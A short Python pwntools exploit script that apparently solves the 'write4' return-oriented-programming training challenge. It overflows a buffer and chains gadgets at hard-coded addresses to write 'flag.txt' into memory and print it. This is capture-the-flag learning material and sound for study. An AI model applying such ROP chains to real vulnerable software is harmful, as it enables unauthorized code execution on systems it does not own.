from pwn import *

def main():
	# chall = gdb.debug("./write4")
	chall = process("./write4")

	junk = b"A" * (40)
	stackAligner = p64(0x400616)
	rdiGadget = p64(0x400693)
	# rbpGadget = p64(0x400588)
	r14r15Gadget = p64(0x400690)
	writeFlagGadget = p64(0x400628)

	
	# flagFileName = p64(0x666c61672e747874)
	flagFileName = b"flag.txt"
	flagAddr = p64(0x601028)
	printFileAddr = p64(0x400510)
	# weirdPrintFileAddr = p64(0x0040061b)

	# print(flagAddr)
	
	# payload =junk + stackAligner + rbpGadget + weirdPrintFileAddr  + stackAligner + printFileAddr
	payload = (junk + stackAligner + r14r15Gadget 
			+ flagAddr + flagFileName + stackAligner 
			+ writeFlagGadget + stackAligner + rdiGadget 
			+ flagAddr + stackAligner + printFileAddr)
	chall.sendafter(b"> ", payload)
	chall.interactive()

if __name__ == "__main__":
	main()
